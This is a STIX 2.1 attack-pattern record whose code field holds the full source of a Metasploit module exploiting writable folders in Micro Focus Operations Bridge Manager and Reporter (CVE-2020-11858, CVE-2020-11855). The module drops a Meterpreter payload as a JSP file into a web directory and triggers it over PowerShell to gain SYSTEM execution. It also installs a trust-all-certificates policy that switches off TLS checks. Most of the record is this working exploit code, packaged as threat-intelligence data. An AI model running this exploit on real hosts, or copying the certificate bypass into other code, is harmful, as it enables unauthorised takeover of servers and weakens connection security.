{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6dd0cde5-76f4-4930-a85c-75c9c141f699",
    "created": "2024-08-14T16:49:11.473093Z",
    "modified": "2024-08-14T16:49:11.473097Z",
    "name": "Micro Focus Operations Bridge Manager / Reporter Local Privilege Escalation",
    "description": " This module exploits an incorrectly permissioned folder in Micro Focus Operations Bridge Manager and Operations Bridge Reporter. An unprivileged user (such as Guest) can drop a JSP file in an exploded WAR directory and then access it without authentication by making a request to the OBM / OBR server. This will result in automatic code execution as SYSTEM. This module has been tested on OBM 2020.05 and OBR 10.40, but it should work out of the box on earlier versions too. Note that it is only exploitable on Windows installations.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/microfocus_operations_privesc.rb",
            "external_id": "microfocus_operations_privesc.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/pedrib/PoC/blob/master/advisories/Micro_Focus/Micro_Focus_OBM.md"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/pedrib/PoC/blob/master/advisories/Micro_Focus/Micro_Focus_OBR.md"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-11858"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-11855"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Windows::Powershell\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Micro Focus Operations Bridge Manager / Reporter Local Privilege Escalation',\n        'Description' => %q{\n          This module exploits an incorrectly permissioned folder in Micro Focus Operations Bridge\n          Manager and Operations Bridge Reporter.\n          An unprivileged user (such as Guest) can drop a JSP file in an exploded WAR directory and\n          then access it without authentication by making a request to the OBM / OBR server.\n          This will result in automatic code execution as SYSTEM. This module has been tested on\n          OBM 2020.05 and OBR 10.40, but it should work out of the box on earlier versions too.\n          Note that it is only exploitable on Windows installations.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Pedro Ribeiro <pedrib[at]gmail.com>', # Vulnerability discovery and Metasploit module\n        ],\n        'Platform' => 'win',\n        'Privileged' => true,\n        'SessionTypes' => ['meterpreter'],\n        'Arch' => [ ARCH_X86, ARCH_X64 ],\n        'Targets' => [\n          [\n            'Micro Focus Operations Bridge Manager (Windows) <= 2020.05',\n            {\n              'Path' => 'C:\\HPBSM\\AppServer\\webapps\\site.war\\LB_Verify.jsp',\n              'Url' => '/topaz/LB_Verify.jsp',\n              'DefaultOptions' => { 'RPORT' => 443 }\n            }\n          ],\n          [\n            'Micro Focus Operations Bridge Reporter (Windows) <= 10.40',\n            {\n              # for OBR only:\n              # - actually we can use any other name besides LB_Verify.jsp\n              # - we can also use any other folder, doesn't need to be BI, as long as\n              # it's reachable on the web server without authentication\n              'Path' => 'C:\\HPE-OBR\\PMDB\\BOWebServer\\webapps\\BI\\LB_Verify.jsp',\n              'Url' => '/BI/LB_Verify.jsp',\n              'DefaultOptions' => { 'RPORT' => 8443 }\n            }\n          ]\n        ],\n        'References' => [\n          [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/Micro_Focus/Micro_Focus_OBM.md'],\n          [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/Micro_Focus/Micro_Focus_OBR.md'],\n          [ 'CVE', '2020-11858'],\n          [ 'CVE', '2020-11855'],\n          [ 'ZDI', '20-1326'],\n          [ 'ZDI', '20-1217'],\n        ],\n        'DisclosureDate' => '2020-10-28',\n        'DefaultTarget' => 0\n      )\n    )\n\n    register_options([\n      Opt::RPORT(443),\n      OptString.new('TARGETURI', [true, 'Base path', '/']),\n      OptBool.new('SSL', [true, 'Negotiate SSL/TLS', true]),\n    ])\n  end\n\n  # paste this here to avoid including Exploit::Remote::HttpClient, which then requires RHOSTS\n  def normalize_uri(*strs)\n    new_str = strs * '/'\n\n    new_str = new_str.gsub!('//', '/') while new_str.index('//')\n\n    # Makes sure there's a starting slash\n    unless new_str[0, 1] == '/'\n      new_str = '/' + new_str\n    end\n\n    new_str\n  end\n\n  def exploit\n    unless session.type == 'meterpreter'\n      fail_with(Failure::None, 'Only meterpreter sessions are supported')\n    end\n\n    unless have_powershell?\n      fail_with(Failure::None, 'No Powershell is installed on the host')\n    end\n\n    # according to /lib/msf/core/post/file.rb this is not binary safe on Windows, but we don't care, it's JSP\n    payload_jsp = Msf::Util::EXE.to_jsp(generate_payload_exe)\n    write_file(target['Path'], payload_jsp)\n\n    if datastore['SSL']\n      prefix = 'https://'\n      # Code below allows us to perform TLS requests to servers with self signed certs\n      # In Powershell 5.1, we can simply use -SkipCertificateCheck, but in older versions we need this\n      # Taken from https://stackoverflow.com/questions/11696944/powershell-v3-invoke-webrequest-https-error\n      ps_cmd = %[\nadd-type @\"\nusing System.Net;\nusing System.Security.Cryptography.X509Certificates;\npublic class TrustAllCertsPolicy : ICertificatePolicy {\n    public bool CheckValidationResult(\n        ServicePoint srvPoint, X509Certificate certificate,\n        WebRequest request, int certificateProblem) {\n        return true;\n    }\n}\n\"@\n$AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'\n[System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols\n[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy\n]\n    else\n      prefix = 'http://'\n      ps_cmd = ''\n    end\n\n    uri = \"#{prefix}127.0.0.1:#{datastore['RPORT']}\" + normalize_uri(datastore['TARGETURI'], target['Url'])\n    print_status(\"JSP dropped, calling it @ #{uri}\")\n    ps_cmd += \"Invoke-WebRequest -Uri #{uri}\"\n    execute_script(ps_cmd)\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-10-28",
    "x_mitre_platforms": [
        "win'"
    ]
}